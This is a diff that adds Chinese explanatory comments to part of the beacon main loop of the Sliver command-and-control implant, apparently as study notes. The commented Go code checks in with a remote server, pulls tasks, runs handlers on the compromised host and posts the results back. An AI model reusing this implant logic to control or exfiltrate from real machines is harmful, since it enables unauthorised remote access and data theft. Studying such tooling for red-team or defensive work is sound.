@@ -62,7 +62,7 @@ import (
 )
 
 var (
-	InstanceID       string
+	InstanceID       string //全局UUID
 	connectionErrors = 0
 )
 
@@ -208,6 +208,8 @@ func beaconStartup() {
 		// {{end}}
 		if beacon != nil {
 			err := beaconMainLoop(beacon)
+			// 仅当执行出现问题时才会return，执行到这里
+			// 将错误次数+1，直到超过允许的最大错误次数，则return，真正退出
 			if err != nil {
 				connectionErrors++
 				if transports.GetMaxConnectionErrors() < connectionErrors {
@@ -313,7 +315,10 @@ func beaconMainLoop(beacon *transports.Beacon) error {
 	// until all tasks complete (in success or failure), if a task handler blocks
 	// forever it will simply block this set of tasks instead of the entire beacon
 	errors := make(chan error)
+	// 当间隔时间被修改后，会触发短路shortCircuit
+	// 因为要在下次使用新的间隔时间
 	shortCircuit := make(chan struct{})
+	// 死循环，除非发生错误，否则不跳出
 	for {
 		duration := beacon.Duration()
 		nextCheckin = time.Now().Add(duration)
@@ -325,7 +330,7 @@ func beaconMainLoop(beacon *transports.Beacon) error {
 				log.Printf("[beacon] main error: %v", nextCheckin)
 				// {{end}}
 				errors <- err
-			} else if oldInterval != beacon.Interval() {
+			} else if oldInterval != beacon.Interval() { // 间隔时间是否修改
 				// The beacon's interval was modified so we need to short circuit
 				// the current sleep and tell the server when the next checkin will
 				// be based on the new interval.
@@ -336,6 +341,7 @@ func beaconMainLoop(beacon *transports.Beacon) error {
 		// {{if .Config.Debug}}
 		log.Printf("[beacon] sleep until %v", nextCheckin)
 		// {{end}}
+		// 跳过条件：错误、短路、超时
 		select {
 		case <-errors:
 			return err
@@ -365,6 +371,7 @@ func beaconMain(beacon *transports.Beacon, nextCheckin time.Time) error {
 	// {{if .Config.Debug}}
 	log.Printf("[beacon] sending check in ...")
 	// {{end}}
+	// httpbeacon: 发送Checkin
 	err = beacon.Send(wrapEnvelope(sliverpb.MsgBeaconTasks, &sliverpb.BeaconTasks{
 		ID:          InstanceID,
 		NextCheckin: int64(beacon.Duration().Seconds()),
@@ -378,6 +385,7 @@ func beaconMain(beacon *transports.Beacon, nextCheckin time.Time) error {
 	// {{if .Config.Debug}}
 	log.Printf("[beacon] recv task(s) ...")
 	// {{end}}
+	// httpbeacon: Get请求 envelope为接收到的数据
 	envelope, err := beacon.Recv()
 	if err != nil {
 		// {{if .Config.Debug}}
@@ -391,6 +399,7 @@ func beaconMain(beacon *transports.Beacon, nextCheckin time.Time) error {
 		// {{end}}
 		return nil
 	}
+	// 反序列化拿到任务
 	tasks := &sliverpb.BeaconTasks{}
 	err = proto.Unmarshal(envelope.Data, tasks)
 	if err != nil {
@@ -410,13 +419,16 @@ func beaconMain(beacon *transports.Beacon, nextCheckin time.Time) error {
 	results := []*sliverpb.Envelope{}
 	resultsMutex := &sync.Mutex{}
 	wg := &sync.WaitGroup{}
+	// 功能RPC map
 	sysHandlers := handlers.GetSystemHandlers()
+	// 特殊的RPC map   当前只有Kill
 	specHandlers := handlers.GetSpecialHandlers()
 
 	for _, task := range tasks.Tasks {
 		// {{if .Config.Debug}}
 		log.Printf("[beacon] execute task %d", task.Type)
 		// {{end}}
+		// 判断任务类型是否存在 sysHandlers
 		if handler, ok := sysHandlers[task.Type]; ok {
 			wg.Add(1)
 			data := task.Data
@@ -454,7 +466,7 @@ func beaconMain(beacon *transports.Beacon, nextCheckin time.Time) error {
 				})
 			})
 			// {{end}}
-		} else if task.Type == sliverpb.MsgOpenSession {
+		} else if task.Type == sliverpb.MsgOpenSession { // 类型是否为 MsgOpenSession
 			go openSessionHandler(task.Data)
 			resultsMutex.Lock()
 			results = append(results, &sliverpb.Envelope{
@@ -462,10 +474,10 @@ func beaconMain(beacon *transports.Beacon, nextCheckin time.Time) error {
 				Data: []byte{},
 			})
 			resultsMutex.Unlock()
-		} else if handler, ok := specHandlers[task.Type]; ok {
+		} else if handler, ok := specHandlers[task.Type]; ok { // 判断是否是退出
 			wg.Add(1)
 			handler(task.Data, nil)
-		} else {
+		} else { // 未知的类型
 			resultsMutex.Lock()
 			results = append(results, &sliverpb.Envelope{
 				ID:                 task.ID,
@@ -477,11 +489,13 @@ func beaconMain(beacon *transports.Beacon, nextCheckin time.Time) error {
 	// {{if .Config.Debug}}
 	log.Printf("[beacon] waiting for task(s) to complete ...")
 	// {{end}}
+	// 等待任务执行完毕
 	wg.Wait() // Wait for all tasks to complete
 	// {{if .Config.Debug}}
 	log.Printf("[beacon] all tasks completed, sending results to server")
 	// {{end}}
 
+	// 发送Post请求，回传任务执行结果
 	err = beacon.Send(wrapEnvelope(sliverpb.MsgBeaconTasks, &sliverpb.BeaconTasks{
 		ID:    InstanceID,
 		Tasks: results,
